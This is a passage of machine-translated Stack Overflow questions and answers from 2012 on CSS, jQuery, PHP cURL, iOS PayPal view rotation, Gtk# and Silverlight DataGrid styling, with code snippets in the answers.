footer a        { color:@footerLink !important; }
footer a:hover  { color:darken(@footerLink, 15%) !important; text-decoration:none; }
#footer-widgets { border-bottom:1px darken(@footerBackground,10%) dotted; padding:20px 0; } 
```

谁能告诉我我该怎么做这个表达？

例子

```
discart if have @ - color:darken(@tuningfooterLink, 15%) !important;
get - text-decoration:none; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:50:49.333

编辑：

试试这个：

```
$a = Get-Content .\your.css
$b = $a | % { $_ -replace "({\s*[a-zA-Z-]*:[^@].*\))(.*;)(\s*}$)", '$1$3' } 
```

然后你可以做

```
Set-Content -Path .\yourchanged.css -Value $b. 
```

一个班轮可以是：

```
( Get-Content .\your.css ) |  % { $_ -replace "({\s*[a-zA-Z-]*:[^@].*\))(.*;)(\s*}$)", '$1$3' } | Set-Content -Path .\yourchanged.css 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-09T20:11:49.310

我不知道powershell，但我不知道正则表达式：

`([a-zA-Z_-]+:[^}{@]*?;)`应该捕获任何不包含`@`我认为的 css 类属性

```
( #group1
  [a-zA-Z_-] #Character class matching a-z, A-Z, _ and -
  + #match character class atleast once (applies to [a-zA-Z_-])
  : #match a :
  [^}{@] #Character class matchting all characters except {, }. and @
  + #match character class atleast once (applies to [^}{@])
  ? #dont be a greedy matcher (applies to +)
  ; #match a ; the closing char for any valid CSS rule
) #close group1 
```

# html - 表格行背景图片

> ID：10514900
> 
> 赞同：9
> 
> 时间：2012-05-09T11:10:06.937
> 
> 标签：html, css

> **可能重复：**
> [我们可以解决多单元表格中的表格行背景图像问题吗？](https://stackoverflow.com/questions/2997405/can-we-solve-the-table-row-background-image-problem-in-chrome-in-multi-celled)

我正在尝试将一个图像作为第一行的背景。问题是背景被单独应用于每个单元格，而不是作为一个整体。有办法解决吗？

[http://jsfiddle.net/bumpy009/c3txj/](http://jsfiddle.net/bumpy009/c3txj/)

结果应如下所示：

![在此处输入图像描述](../Images/d7a2426c7563cf077f55a3428bfd7733.png)

编辑：问题仅出现在 Safari、Opera 和 chrome 中。还没查IE。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-09T12:06:24.460

如果您希望它跨越每一行，为什么不将其作为表格背景并在 y 轴上重复呢？

```
table {
    width: 300px;
    background-image: url('mypic.jpg');
    background-repeat: repeat-y;
} 
```

顺便说一句，我用 IE9、FF12 测试了你的代码——它们每行显示一次图像。但是 Chrome 15 和 Safari 5 会为每个 td 重复它。

# 编辑

由于您只希望它在第一行，因此您应该使用背景位置来确保图像保持在表格的顶部（这通常是第一行的位置，对吗？：P）

```
table {
    width: 300px;
    background-image: url('mypic.png');
    background-repeat: no-repeat;
    background-position: center top;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-09T12:16:52.070

我不知道您的单元格宽度（它们是可变的吗？），但表格元素会这样呈现。为了获得所需的效果，它们需要显示为其他内容：

```
tr {display: block;}
td, th {display: inline-block; background: transparent;} 
```

您会注意到，现在您需要为 td 和 th 元素设置宽度。

请参阅[**演示**](http://jsfiddle.net/c3txj/11/)。

# php - cURL：需要发布值吗？

> ID：10514901
> 
> 赞同：-1
> 
> 时间：2012-05-09T11:10:12.983
> 
> 标签：php, post, curl

我正在使用 php 和 curl 来获取各种网站的内容。有些网站需要发布值。我想检查网站是否期望发送任何帖子值。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:12:57.603

你不能这样做，除非网站在他们的响应标题中明确告诉你他们期望什么（而且他们很少，如果有的话）。您可以做的最好的事情是查看请求中返回的标头。您无法自动执行此过程。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T11:13:47.637

不完全确定你在这里问什么 OP。但是，当在 cURL 中创建脚本以自动与其他网站交互时，您通常必须手动调查以找出需要传递哪些参数才能获得所需的信息......

这将是使用源代码视图等工具的情况，以及允许您修改发布信息（忘记它的名称）以查看访问该站点时实际发生的情况的 firefox 插件。

# javascript - 可以在 jquery 中按 lat, long 创建谷歌地图。谷歌地图API

> ID：10514905
> 
> 赞同：1
> 
> 时间：2012-05-09T11:10:23.503
> 
> 标签：javascript, jquery, google-maps, google-maps-api-2

我有`lat, long`一个地方的价值观。我怎样才能`lat , long`使用它创建一个谷歌地图`googl maps api , jquery`

这可能吗 ？？

目前 iv 正在使用 lat , long 值

```
 var address = jQuery('#business-address').val();
        var city = jQuery('.city').val();
        var state = jQuery('.state').val();
        var country = jQuery('.country').val();

        var address_string = address+","+city+","+state+","+country;

        var geocoder = new google.maps.Geocoder();

           if (geocoder) {
              geocoder.geocode({ 'address': address_string }, function (results, status) {
                 if (status == google.maps.GeocoderStatus.OK) {
                    alert(results[0].geometry.location);
                 }
                 else {
                    alert("Geocoding failed: " + status);
                 }
              });
           } 
```

# html - jQuery Mobile - 如何在页面周围放置实心边框

> ID：10514906
> 
> 赞同：0
> 
> 时间：2012-05-09T11:10:33.983
> 
> 标签：html, css, jquery-mobile, border-layout

我正在使用 jQuery mobile 构建我的第一个应用程序，并且从一开始就已经坚持了下来。下面是我所追求的屏幕截图。我已经把内容涂黑了。

如何在持久的框架周围添加实心边框？

![带边框的应用](../Images/585be67f9362235daaa426c6a01a09ed.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T11:46:36.820

使用以下方法自己解决了：

```
.ui-mobile [data-role="page"] {
    box-sizing: border-box !important;
    border: 10px solid #e6e6e6 !important;
    height: 100% !important;
}
.ui-mobile [data-role="header"] {
    box-sizing: border-box !important;
    border: 10px solid #e6e6e6 !important;
    border-bottom: none !important;
}
.ui-mobile [data-role="footer"] {
    box-sizing: border-box !important;
    border: 10px solid #e6e6e6 !important;
    border-top: none !important;
} 
```

和

```
<div data-role="page">
    <div data-role="header" data-position="fixed" data-tap-toggle="false">
        <h1>My Title</h1>
    </div><!-- /header -->

    <div data-role="content">
        <p>Hello world</p>
    </div><!-- /content -->

    <div data-role="footer" data-position="fixed" data-tap-toggle="false">
        <h1>My Title</h1>
    </div><!-- /footer -->
</div><!-- /page --> 
```

到目前为止，没有遇到任何问题，如果以后我遇到此代码的问题，我不会感到惊讶。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T11:47:41.067

您可以覆盖 .ui-page 类

```
.ui-page {
    border: 0;
} 
```

类似于：

> .ui-page { 边框：2px 纯红色；}

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T13:29:11.077

简单的：

```
<div data-role="page" id="some_page">
    <div data-role="content" class="ui-content" id="main_content">
        <div class="ui-corner-all ui-shadow" style="padding: 1em;">
        </div>
    </div>
</div> 
```

# iphone - 有没有办法让 PayPal 网络视图旋转为横向模式？

> ID：10514908
> 
> 赞同：2
> 
> 时间：2012-05-09T11:10:34.800
> 
> 标签：iphone, ios, xcode, ipad, paypal

我目前正在开发一个 ios 应用程序，该应用程序使用 PayPal 的移动支付库来促进商品支付。问题是 Paypal 生成了一个设置为纵向模式的 Web 视图。据我所知，这是在 payPal 库中生成的，无论如何我都无法访问它。有没有办法让网页视图在横向模式下旋转。经过大量搜索后，我发现大多数人都只是在使用纵向模式，有没有办法让它旋转到横向。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-24T20:37:56.390

实际上有一种方法可以在 iOS 中手动旋转 paypal 的复选框视图。这个视图是 PayPalViewClass 的一个实例。只需添加一个方法来查看所有视图和所有子视图以查找此类的实例。一旦你找到了你正在寻找的视图，只需对其应用 setTransform 方法。该方法应如下所示：

```
-(void)cicle:(UIView *)aView {
    for (UIView *_v in [aView subviews]) {
        if ([_v isKindOfClass:[NSClassFromString(@"PayPalViewClass") class]]) {
            [aView setTransform:CGAffineTransformMakeRotation(-M_PI/2)];
        }
        [self cicle:_v];
    }
} 
```

它应该在您的 payWithPayPal 方法中调用。我希望这有帮助 ;）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:17:23.423

对于 Paypal 库 v1.6.0，`PayPalViewClass`它位于应用程序 main 的视图层次结构中`window`。

1.  您只需要调用@alex 提供的方法并传递您的应用程序的委托窗口。
2.  得到窗口`[[[UIApplication sharedApplication] delegate] window]`就足够了。
3.  在您拨打`-advancedCheckoutWithPayment:`或后拨打电话`-checkoutWithPayment:`。

如果您允许所有方向，则需要`PayPalViewClass`相应地转换为设备方向。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-03T07:02:56.237

我有同样的问题。由于 PayPal 将其视图添加到键窗口而不是根视图控制器，因此它忽略了设备方向。

这里有很多问题可以解释横向问题，当直接向窗口添加子视图时，例如： [UIInterfaceOrientation always return Portrait in AppDelegate iPad?](https://stackoverflow.com/questions/8816252/uiinterfaceorientation-always-return-portrait-in-appdelegate-ipad)

我正在尝试捕获 PayPal UIView 并手动旋转它，但还没有弄清楚是否可能。

# c# - Gtk# statusicon 消失

> ID：10514912
> 
> 赞同：1
> 
> 时间：2012-05-09T11:10:39.513
> 
> 标签：c#, mono, gtk#

我对 statuicon 有一个非常奇怪的问题。

我正在做一个简单的项目来保存和显示表中的一些数据，我有一个主窗口（MainWindow），用户在其中插入数据，然后还有另一个窗口显示数据（SumList）。还有一个状态图标，我通过子类化 Gtk.StatusIcon 创建了一个状态图标。问题是，当我启动应用程序并显示应该显示数据的窗口（一切正常）然后关闭窗口（无论如何）时，statusIcon 从面板中消失。

我还发现这是因为类 SumList 的构造函数的长度。如果我从那里删除一些行（随机顺序），状态图标工作正常。

我该如何解决这种奇怪的行为？

编辑#1 我尽量不将 StatusIcon 子类化，而是将其声明为 MainClass 的静态成员，现在它可以正常工作，很奇怪。无论如何，问题是如果 statusIcon 未声明为静态的，为什么它不起作用？

MainClass (StatusIcon)

```
class MainClass : StatusIcon
{
    MainWindow window;

    private MainClass()
    {
        window = new MainWindow();
        window.Show();

        Stock = Gtk.Stock.Home;

        PopupMenu += rightClick;
        Activate += leftClick;
    }

    private void rightClick (object sender, Gtk.PopupMenuArgs evt){

        window.Hide();
    }

    private void leftClick (object sender, EventArgs e){
        window.Show();

    }

    public static void Main (string[] args)
    {
        Application.Init ();
        new MainClass();

        Application.Run ();
    }
} 
```

SumList 类

```
public partial class SumList : Gtk.Window
{       
    public SumList () : base(Gtk.WindowType.Toplevel)
    {
        this.Build ();      
        // create the "title" column ------------ //
        TreeViewColumn title = new TreeViewColumn();
        CellRendererText titleR = new CellRendererText();
        title.PackStart(titleR, true);          
        title.AddAttribute(titleR, "text", 0);

        // create the "detial" column ----------- //
        TreeViewColumn detail = new TreeViewColumn();
        CellRendererText detailR = new CellRendererText();
        detail.PackStart(detailR, true);
        detail.AddAttribute(detailR, "text", 1);

        // create the "price" column ------------ //
        TreeViewColumn price = new TreeViewColumn();
        CellRendererText priceR = new CellRendererText();
        price.PackStart(priceR, true);
        price.AddAttribute(priceR, "text", 2);

        // create the "date" column ------------- //
        TreeViewColumn date = new TreeViewColumn();
        CellRendererText dateR = new CellRendererText();
        date.PackStart(dateR, true);
        date.AddAttribute(dateR, "text", 3);

        // set the columns names
        title.Title = "Title";
        detail.Title = "Detail";
        price.Title = "Price";  
        date.Title = "Date";

        // append columns to the treeview       
        this.treeview.AppendColumn(title);
        this.treeview.AppendColumn(detail);
        this.treeview.AppendColumn(price);
        this.treeview.AppendColumn(date);

        // set the model
        this.treeview.Model = Singleton.Model.Instance.Data;    

    }
} 
```

主窗口类

```
public partial class MainWindow: Gtk.Window{    

    public MainWindow (): base (Gtk.WindowType.Toplevel){
        Build ();
    }

    protected void OnDeleteEvent (object sender, DeleteEventArgs a){
        Application.Quit ();
        a.RetVal = true;
    }

    protected void OnButtonOKClicked (object sender, System.EventArgs e){
        SumList list = new SumList();
        list.Show();
    }

    protected void onButtonHideClicked (object sender, System.EventArgs e){
        entrySum.Text = "";
        entryTitle.Text = "";
        this.Hide();
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-10T20:34:12.977

很简单，您的 GTK 控件正在收集垃圾。

```
public static void Main (string[] args)
{
    Application.Init ();
    new MainClass();

    Application.Run ();
} 
```

您现在不再有任何对您的`MainClass`实例的实时引用。IMO，您很幸运该程序甚至可以做到这一点。

# html - 如何定义默认情况下其中一个菜单项处于活动状态？

> ID：10514915
> 
> 赞同：1
> 
> 时间：2012-05-09T11:10:45.993
> 
> 标签：html, css, menu

如何定义默认情况下其中一个菜单项处于活动状态？

```
 /* CSS */
        ul#menu a.active, ul#menu a:focus {
        outline-style: none;
        color: #AA0000;
        font-weight: bold;
        text-decoration: underline;
        }

    /* HTML */
    <html>
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
      <script type="text/javascript" src="scripts/hormenu_selector.js"></script>

        </head>
        <body>
<div  id = "menu">
        <ul>
        <li><a href="#" class="active">Test1</a></li>
        <li><a href="#">Test2</a></li>
        </ul>
</div>
    </body>
    </html>

    /* HORMENU_SELECTOR.JS */
    $(document).ready(function() {
    $('#menu ul li a').each(function() {
        var path = window.location.href;
        var current = path.substring(path.lastIndexOf('/'));
        var url = $(this).attr('href');

        if (url == current) {
            $(this).addClass('active');
        };
    });     
    }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:15:22.097

您在 CSS 规则中使用伪`:active`而不是类`active`。

尝试：

```
ul#menu a.active, ul#menu a:focus 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-09T11:15:57.760

假设你有这样的东西，

```
<div id="Menu"> 
<ul>
<li><a href="/Home.aspx">Home</a></li>
<li><a href="/Products.aspx">Products</a></li>
<li><a href="/AboutUs.aspx">About us</a></li>
<li><a href="/ContactUs.aspx">Contact us</a></li>
</ul>
</div> 
```

对于要选择的活动菜单项，请尝试使用 jquery

```
$(document).ready(function() {

$('#Menu ul li a').each(function() {
    var path = window.location.href;
    var current = path.substring(path.lastIndexOf('/'));
    var url = $(this).attr('href');

    if (url == current) {
        $(this).addClass('active');
    };
});     

}); 
```

希望能帮助到你

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T11:15:59.470

在我看来，您可以将“a.active”添加到css定义中：

```
ul#menu li a.active, ul#menu li a:focus {
    outline-style: none;
    color: #AA0000;
    font-weight: bold;
    text-decoration: underline;
} 
```

这样，由于类的原因，它最初是活跃的。您还可以删除 a:active 并像这样使用 jquery：

```
$("ul#menu li a").click(function() { $(this).addClass("active") }); 
```

# jquery - 无法让 $.getJson 工作，与用户名和密码有关

> ID：10514917
> 
> 赞同：0
> 
> 时间：2012-05-09T11:10:59.100
> 
> 标签：jquery, ajax, asp.net-mvc

在我的**MVC 应用程序**中，我`getJSON`用于一些服务器调用。但是它们不起作用。深埋在它打破的 jquery 1.4.2 库中。对于 e 对象`username`和密码不存在。然而，在`$.getJson`我看到的文档中，没有`username`我应该注意的密码。那么下面的代码有什么问题呢？

```
var dataService = new function () {
    $.ajaxSetup ({   
        cache: false
    });
        addBusinessUnit = function(employeeId, businessUnitId, callback) {
            $.getJSON('<%= Url.Action("AddBusinessUnitForDepartmentAdministrator", "DataService")%>',
                { employeeId: employeeId, businessUnitId: businessUnitId },
                function(data) {
                    callback(data);
                });
        },
        deleteBusinessUnit = function(employeeId, businessUnitId, callback) {
            $.getJSON('<%= Url.Action("DeleteBusinessUnitForDepartmentAdministrator", "DataService")%>',
                { employeeId: employeeId, businessUnitId: businessUnitId },
                function(data) {
                    callback(data);
                });
        };

    return {
        addBusinessUnit: addBusinessUnit,
        deleteBusinessUnit: deleteBusinessUnit
    };

} (); 
```

***编辑：***

这是我的服务器端代码。

```
public ActionResult AddBusinessUnitForDepartmentAdministrator(
        int employeeId, int businessUnitId)
    {
        var input = new DepartmentAdministratorExtraDepartment(employeeId, businessUnitId);
        return new JsonResult
                   {
                       Data = input.AddNewPermission(),
                       JsonRequestBehavior = JsonRequestBehavior.AllowGet
                   };
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-10T07:54:54.780

好的，我找到了解决方案。我希望我再也不会犯这个错误了！只是 JS 在它自己的文件中，因此 Url.Action 命令无法获取页面的上下文！我不知道是否可以在 JS/Jquery 中访问页面上下文对象，但无论如何我所要做的就是在从页面调用数据服务时放入一个 Url 参数，它就可以工作了。

# silverlight - 如何在silverlight中删除DataGrid周围的边框

> ID：10514918
> 
> 赞同：0
> 
> 时间：2012-05-09T11:11:02.137
> 
> 标签：silverlight, silverlight-4.0

当我尝试使用 BorderThickness="0" BorderBrush="Transparent" 时，如何在 silverlight 中删除数据网格周围的边框，它会删除网格左右两侧和底部的 broder，但不是顶部我认为那是标题边框或但不确定我是否也删除了标题 HeadersVisibility="None" 如果有人可以提供帮助，那就太好了。

干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T21:12:09.130

您看到的元素是一个`Rectangle`被调用的`ColumnHeadersAndRowsSeparator`. 只需创建一个`Style`没有它：

```
 <Style TargetType="sdk:DataGrid">
        <Setter Property="RowBackground" Value="#AAEAEFF4" />
        <Setter Property="AlternatingRowBackground" Value="#00FFFFFF" />
        <Setter Property="Background" Value="#FFFFFFFF" />
        <Setter Property="HeadersVisibility" Value="Column" />
        <Setter Property="HorizontalScrollBarVisibility" Value="Auto" />
        <Setter Property="VerticalScrollBarVisibility" Value="Auto" />
        <Setter Property="SelectionMode" Value="Extended" />
        <Setter Property="CanUserReorderColumns" Value="True" />
        <Setter Property="CanUserResizeColumns" Value="True" />
        <Setter Property="CanUserSortColumns" Value="True" />
        <Setter Property="AutoGenerateColumns" Value="True" />
        <Setter Property="RowDetailsVisibilityMode" Value="VisibleWhenSelected" />
        <Setter Property="BorderBrush">
            <Setter.Value>
                <LinearGradientBrush EndPoint="0.5,1" StartPoint="0.5,0">
                    <GradientStop Color="#FFA3AEB9" Offset="0"/>
                    <GradientStop Color="#FF8399A9" Offset="0.375"/>
                    <GradientStop Color="#FF718597" Offset="0.375"/>
                    <GradientStop Color="#FF617584" Offset="1"/>
                </LinearGradientBrush>
            </Setter.Value>
        </Setter>
        <Setter Property="BorderThickness" Value="1" />
        <Setter Property="DragIndicatorStyle">
            <Setter.Value>
                <!-- TODO: Change the TargetType to Control when the fix Jolt bugs 18719 is verified -->
                <Style TargetType="ContentControl">
                    <Setter Property="Foreground" Value="#7FFFFFFF" />
                    <Setter Property="Template">
                        <Setter.Value>
                            <!-- TODO: Change the TargetType to Control when the fix Jolt bugs 18719 is verified -->
                            <ControlTemplate TargetType="ContentControl">
                                <Grid>
                                    <VisualStateManager.VisualStateGroups>
                                        <VisualStateGroup x:Name="SortStates">
                                            <VisualState x:Name="Unsorted" />
                                            <VisualState x:Name="SortAscending">
                                                <Storyboard>
                                                    <DoubleAnimation Storyboard.TargetName="SortIcon" Storyboard.TargetProperty="Opacity" Duration="0" To="1.0"/>
                                                </Storyboard>
                                            </VisualState>
                                            <VisualState x:Name="SortDescending">
                                                <Storyboard>
                                                    <DoubleAnimation Storyboard.TargetName="SortIcon" Storyboard.TargetProperty="Opacity" Duration="0" To="1.0"/>
                                                    <DoubleAnimation Storyboard.TargetName="SortIcon" Storyboard.TargetProperty="(RenderTransform).ScaleY" Duration="0" To="-.9"/>
                                                </Storyboard>
                                            </VisualState>
                                        </VisualStateGroup>
                                    </VisualStateManager.VisualStateGroups>

                                    <Rectangle x:Name="BackgroundRectangle" Stretch="Fill" Fill="#66808080" Grid.ColumnSpan="2" />

                                    <Rectangle x:Name="BackgroundGradient" Stretch="Fill" Grid.ColumnSpan="2" Opacity="0" >
                                        <Rectangle.Fill>
                                            <LinearGradientBrush StartPoint=".7,0" EndPoint=".7,1">
                                                <GradientStop Color="#FFFFFFFF" Offset="0.015" />
                                                <GradientStop Color="#F9FFFFFF" Offset="0.375" />
                                                <GradientStop Color="#E5FFFFFF" Offset="0.6" />
                                                <GradientStop Color="#C6FFFFFF" Offset="1" />
                                            </LinearGradientBrush>
                                        </Rectangle.Fill>
                                    </Rectangle>

                                    <Grid HorizontalAlignment="{TemplateBinding HorizontalContentAlignment}" VerticalAlignment="{TemplateBinding VerticalContentAlignment}" Margin="{TemplateBinding Padding}">
                                        <Grid.ColumnDefinitions>
                                            <ColumnDefinition/>
                                            <ColumnDefinition Width="Auto" />
                                        </Grid.ColumnDefinitions>

                                        <ContentPresenter Content="{TemplateBinding Content}"/>

                                        <Path Grid.Column="1" Name="SortIcon" Fill="#7FFFFFFF" RenderTransformOrigin=".5,.5" HorizontalAlignment="Left" VerticalAlignment="Center" Opacity="0" Stretch="Uniform" Width="8" Margin="4,0,0,0" Data="F1 M -5.215,6.099L 5.215,6.099L 0,0L -5.215,6.099 Z ">
                                            <Path.RenderTransform>
                                                <ScaleTransform ScaleX=".9" ScaleY=".9" />
                                            </Path.RenderTransform>
                                        </Path>
                                    </Grid>
                                </Grid>
                            </ControlTemplate>
                        </Setter.Value>
                    </Setter>
                </Style>
            </Setter.Value>
        </Setter>
        <Setter Property="DropLocationIndicatorStyle">
            <Setter.Value>
                <Style TargetType="ContentControl">
                    <Setter Property="Background" Value="#FF3F4346"/>
                    <Setter Property="Width" Value="2"/>
                    <Setter Property="Template">
                        <Setter.Value>
                            <ControlTemplate TargetType="ContentControl">
                                <Rectangle Fill="{TemplateBinding Background}" Width="{TemplateBinding Width}" Height="{TemplateBinding Height}"/>
                            </ControlTemplate>
                        </Setter.Value>
                    </Setter>
                </Style>
            </Setter.Value>
        </Setter>
        <Setter Property="GridLinesVisibility" Value="Vertical" />
        <Setter Property="HorizontalGridLinesBrush" Value="#FFC9CACA" />
        <Setter Property="IsTabStop" Value="True" />
        <Setter Property="VerticalGridLinesBrush" Value="#FFC9CACA" />
        <Setter Property="Template">
            <Setter.Value>
                <ControlTemplate TargetType="sdk:DataGrid">
                    <Grid>
                        <VisualStateManager.VisualStateGroups>
                            <VisualStateGroup x:Name="CommonStates">
                                <VisualState x:Name="Normal"/>
                                <VisualState x:Name="Disabled">
                                    <Storyboard>
                                        <DoubleAnimation Storyboard.TargetName="DisabledVisualElement" Storyboard.TargetProperty="Opacity" Duration="0" To="1"/>
                                    </Storyboard>
                                </VisualState>
                            </VisualStateGroup>
                        </VisualStateManager.VisualStateGroups>
                        <Border BorderThickness="{TemplateBinding BorderThickness}" BorderBrush="{TemplateBinding BorderBrush}" CornerRadius="2">
                            <Grid Name="Root" Background="{TemplateBinding Background}">
                                <Grid.Resources>
                                    <!--Start: TopLeftHeaderTemplate-->
                                    <ControlTemplate x:Key="TopLeftHeaderTemplate" TargetType="localprimitives:DataGridColumnHeader">
                                        <Grid Name="Root">
                                            <Grid.RowDefinitions>
                                                <RowDefinition/>
                                                <RowDefinition/>
                                                <RowDefinition Height="Auto" />
                                            </Grid.RowDefinitions>
                                            <Border BorderThickness="0,0,1,0" BorderBrush="#FFC9CACA" Background="#FF1F3B53" Grid.RowSpan="2">
                                                <Rectangle Stretch="Fill" StrokeThickness="1">
                                                    <Rectangle.Fill>
                                                        <LinearGradientBrush StartPoint=".7,0" EndPoint=".7,1">
                                                            <GradientStop Color="#FCFFFFFF" Offset="0.015" />
                                                            <GradientStop Color="#F7FFFFFF" Offset="0.375" />
                                                            <GradientStop Color="#E5FFFFFF" Offset="0.6" />
                                                            <GradientStop Color="#D1FFFFFF" Offset="1" />
                                                        </LinearGradientBrush>
                                                    </Rectangle.Fill>
                                                </Rectangle>
                                            </Border>
                                            <Rectangle VerticalAlignment="Bottom" Width="Auto" StrokeThickness="1" Height="1" Fill="#FFDBDCDC" Grid.RowSpan="2"/>
                                        </Grid>
                                    </ControlTemplate>
                                    <!--End: TopLeftHeaderTemplate-->

                                    <!--Start: TopRightHeaderTemplate-->
                                    <ControlTemplate x:Key="TopRightHeaderTemplate" TargetType="localprimitives:DataGridColumnHeader">
                                        <Grid Name="RootElement">
                                            <Grid.RowDefinitions>
                                                <RowDefinition/>
                                                <RowDefinition/>
                                                <RowDefinition Height="Auto" />
                                            </Grid.RowDefinitions>
                                            <Border BorderThickness="1,0,0,0" BorderBrush="#FFC9CACA" Background="#FF1F3B53" Grid.RowSpan="2">
                                                <Rectangle Stretch="Fill">
                                                    <Rectangle.Fill>
                                                        <LinearGradientBrush StartPoint=".7,0" EndPoint=".7,1">
                                                            <GradientStop Color="#FCFFFFFF" Offset="0.015" />
                                                            <GradientStop Color="#F7FFFFFF" Offset="0.375" />
                                                            <GradientStop Color="#E5FFFFFF" Offset="0.6" />
                                                            <GradientStop Color="#D1FFFFFF" Offset="1" />
                                                        </LinearGradientBrush>
                                                    </Rectangle.Fill>
                                                </Rectangle>
                                            </Border>
                                        </Grid>
                                    </ControlTemplate>
                                    <!--End: TopRightHeaderTemplate-->
                                </Grid.Resources>

                                <Grid.RowDefinitions>
                                    <RowDefinition Height="Auto" />
                                    <RowDefinition/>
                                    <RowDefinition Height="Auto" />
                                    <RowDefinition Height="Auto" />
                                </Grid.RowDefinitions>
                                <Grid.ColumnDefinitions>
                                    <ColumnDefinition Width="Auto" />
                                    <ColumnDefinition/>
                                    <ColumnDefinition Width="Auto" />
                                </Grid.ColumnDefinitions>

                                <localprimitives:DataGridColumnHeader Name="TopLeftCornerHeader" Template="{StaticResource TopLeftHeaderTemplate}" Width="22" />
                                <localprimitives:DataGridColumnHeadersPresenter Name="ColumnHeadersPresenter" Grid.Column="1"/>
                                <localprimitives:DataGridColumnHeader Name="TopRightCornerHeader" Grid.Column="2" Template="{StaticResource TopRightHeaderTemplate}" />
                                 <!-- HERE IT IS THAT LINE YOU SEE -->                                                                       
                                <!--<Rectangle Name="ColumnHeadersAndRowsSeparator" Grid.ColumnSpan="3" VerticalAlignment="Bottom" Width="Auto" StrokeThickness="1" Height="1" Fill="#FFC9CACA"/>-->

                                <localprimitives:DataGridRowsPresenter Name="RowsPresenter" Grid.ColumnSpan="2" Grid.Row="1" />
                                <Rectangle Name="BottomRightCorner" Fill="#FFE9EEF4" Grid.Column="2" Grid.Row="2" />
                                <Rectangle Name="BottomLeftCorner" Fill="#FFE9EEF4" Grid.Row="2" Grid.ColumnSpan="2" />
                                <ScrollBar Name="VerticalScrollbar" Orientation="Vertical" Grid.Column="2" Grid.Row="1" Width="18" Margin="0,-1,-1,-1"/>

                                <Grid Grid.Column="1" Grid.Row="2">
                                    <Grid.ColumnDefinitions>
                                        <ColumnDefinition Width="Auto" />
                                        <ColumnDefinition/>
                                    </Grid.ColumnDefinitions>
                                    <Rectangle Name="FrozenColumnScrollBarSpacer" />
                                    <ScrollBar Name="HorizontalScrollbar" Grid.Column="1" Orientation="Horizontal" Height="18" Margin="-1,0,-1,-1"/>
                                </Grid>

                            </Grid>
                        </Border>
                        <Border x:Name="DisabledVisualElement" IsHitTestVisible="False" Height="Auto" HorizontalAlignment="Stretch" VerticalAlignment="Stretch" Width="Auto" CornerRadius="2" Background="#8CFFFFFF" Opacity="0"/>
                    </Grid>
                </ControlTemplate>
            </Setter.Value>
        </Setter>
    </Style> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-09T11:21:12.027

在 Silverlight 2 Beta 2 中，生成的 DataGrid 被边框包围。不幸的是，无法通过简单地在 DataGrid 上设置一个属性来移除此边框。要删除它，需要覆盖 DataGrid 样式或“皮肤”的定义。

每个 Silverlight 控件 (FrameworkElement) 的外观在 ControlTemplate 中定义。使用样式，可以使用一组自定义 XAML 代码在您的应用程序中覆盖此模板。默认 XAML 定义可在 Silverlight 控件样式和模板文档中找到。特定于本主题，DataGrid 的 XAML 定义可在 DataGrid 样式和模板文档中找到。

在 DataGrid XAML 中，查找模板定义。一旦找到它，请注意 DataGrid 的 RootElement 被三个不同的 Border 元素包围。

这些元素很可能是需要删除的项目。要开始自定义，需要将 DataGrid 的样式 XAML 作为新资源添加到我们的应用程序中。我将把它直接添加到我的 UserControl，但它也可以添加到应用程序资源（在 App.xaml 中）。

要将 XAML 添加到 UserControl，请创建一个名为 UserControl.Resources 的新节点并将 DataGrid XAML 复制到其中（使用文档网页上方便的“复制代码”链接）。

DataGrid 和资源的命名空间定义必须匹配。在复制的 XAML 中，命名空间是 local:DataGrid。Visual Studio 工具生成的默认命名空间是 my:DataGrid。在上面的示例中，我将所有对 local 的引用更改为 my.

下一个需要注意的是 Style 必须有一个 Key。这用于将框架元素（我们的 DataGrid）映射到特定的样式定义。我已经为样式提供了 TestGrid 的键，它在以下 DataGrid 定义中使用。

此时，当您运行应用程序时，DataGrid 应该与之前完全相同（我们还没有更改任何内容）。

在我开始删除 Border 元素的定义之前，我想确保这些是罪魁祸首。为此，我要将它们的颜色更改为更明显的颜色。

运行应用程序，我得到一个屏幕

放大后，很明显这些元素如何参与 DataGrid 的显示。

从 XAML 中删除 Border 元素会生成所需的结果。

希望这不仅提供了如何从 DataGrid 中删除边框的参考，而且还提供了对自定义 Silverlight 控件可用可能性的快速介绍。

复制自：[http ://devcenter.auburnrandall.com/Default.aspx?type=post&id=52](http://devcenter.auburnrandall.com/Default.aspx?type=post&id=52)

# iphone - 在具有无限滚动IOS的gridview中一次垂直和水平scoll

> ID：10514920
> 
> 赞同：1
> 
> 时间：2012-05-09T11:11:11.523
> 
> 标签：iphone, ios, uiscrollview, rubiks-cube

如何在网格视图中同时启用水平和垂直滚动？

如果我有一个 4x4 的缩略图网格，我想实现双向滑动，左/右和上/下。目前我完成了左右滑动，但如果我选择第二个单元格并向上滑动，第二行应该像魔方一样滚动。

如果有人有任何想法，请分享。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-19T20:08:37.377

自从您提出问题以来已经有一段时间了，但是由于我一直在为同样的事情而苦苦挣扎，所以我将回答它以供将来参考...

可悲的是，我在任何地方都找不到一个好的解决方案，所以经过数小时的试验后，我想出了这个：[https ://github.com/AlvinNutbeij/DWGridController](https://github.com/AlvinNutbeij/DWGridController)

